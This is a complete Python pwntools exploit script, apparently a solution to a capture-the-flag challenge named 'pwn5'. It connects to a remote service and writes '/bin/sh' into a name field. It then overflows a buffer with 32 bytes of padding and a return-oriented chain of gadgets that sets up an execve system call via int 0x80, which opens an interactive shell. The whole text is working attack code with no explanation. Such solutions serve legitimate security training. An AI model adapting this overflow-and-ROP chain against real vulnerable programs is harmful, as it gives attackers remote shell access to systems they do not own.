from pwn import *

elf = ELF('./pwn5')
r = remote('pwn.ctf.tamu.edu', 4325)


r.sendline('/bin/sh\x00')
r.sendline('/bin/sh\x00')
r.sendline('y')
r.sendline('y')
r.sendline('2')

chain = ''
chain += 'A' * 32
chain += p32(0x080bc396) # pop eax; ret
chain += p32(0xb)

chain += p32(0x08054aed) # pop ebx; ret
chain += p32(elf.symbols['first_name'])

chain += p32(0x080e4325) # pop ecx; ret
chain += p32(0)

chain += p32(0x0807338a) # pop edx; ret
chain += p32(0)

chain += p32(0x08071005) # int 0x80

r.sendline(chain)

r.interactive()
